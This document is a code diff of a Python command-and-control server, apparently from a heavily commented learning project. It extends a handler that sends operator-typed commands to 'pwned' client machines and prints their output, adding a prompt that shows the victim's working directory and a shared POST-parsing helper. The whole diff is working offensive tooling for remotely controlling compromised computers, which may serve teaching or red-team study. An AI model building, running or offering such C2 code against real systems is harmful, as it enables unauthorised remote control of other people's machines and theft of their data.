@@ -3,7 +3,7 @@
 from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
-from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, BIND_ADDR
+from settings import CWD_RESPONSE, PORT, CMD_REQUEST, RESPONSE, RESPONSE_KEY, BIND_ADDR
 
 class C2Handler(BaseHTTPRequestHandler):
     """This is a child class of the BaseHTTPRequestHandler class.
@@ -49,7 +49,7 @@ class C2Handler(BaseHTTPRequestHandler):
             elif client == pwned_dict[active_session]:
 
                 # Collect the command to run on the client; set Linux style promt as well
-                command = input(f"{client_account}@{client_hostname}: ")
+                command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
 
                 # Write the command back to the client as a response; must utf-8 encode
                 try:
@@ -96,28 +96,40 @@ class C2Handler(BaseHTTPRequestHandler):
         """ This method handles all HTTP POST requests that
         arrive at the c2 server."""
 
-        # Follow this code block when the compromised computer is requesting a command
-        if self.path == RESPONSE_PATH:
-                
-             # Sends the HTTP response code and header back to the client
-            self.http_response(200)
+        # Follow this code block when the compromised computer is responding with data to be printed on the screen
+        if self.path == RESPONSE:
+            print(self.handle_post_data())
 
-            # Get Content-Length value from HTTP Headers
-            content_length = int(self.headers.get("Content-Length"))
+        # Follow this code block when the compromised computer is responding with its current working directory
+        elif self.path == CWD_RESPONSE:
+            global cwd
+            cwd = self.handle_post_data()
 
-            # Gather the client's data by reading in the HTTP POST data
-            client_data = self.rfile.read(content_length)
+        # Nobody should ever be posting to our c2 server other than to the above paths
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server. Why?\n")
 
-            # UTF-8 decode the client's data
-            client_data = client_data.decode()
-        
-            # Remove the HTTP POST variable and the equal sign from the client's data
-            client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
 
-            # HTML/URL decode the client's data and translate "+" to a space
-            client_data = unquote_plus(client_data)
-            print(client_data)
+    def handle_post_data(self):
+        """ Function to handle post data from a client. """
 
+        # Sends the HTTP response code and header back to the client
+        self.http_response(200)
+
+        # Get Content-Length value from HTTP Headers
+        content_length = int(self.headers.get("Content-Length"))
+
+        # Gather the client's data by reading in the HTTP POST data
+        client_data = self.rfile.read(content_length)
+
+        # UTF-8 decode the client's data
+        client_data = client_data.decode()
+    
+        # Remove the HTTP POST variable and the equal sign from the client's data
+        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
+        # HTML/URL decode the client's data and translate "+" to a space
+        client_data = unquote_plus(client_data)
+        return client_data
 
     def http_response(self, code: int):
         """ Function that sends the HTTP response code and headers back to the client."""
@@ -132,6 +144,9 @@ class C2Handler(BaseHTTPRequestHandler):
 
 # This maps to the client that we have a promt for
 active_session = 1
+
+# This is the current working directory from the client belonging to the active session
+cwd = "~"
 
 # This is the account from the client belonging to the active session
 client_account = ""
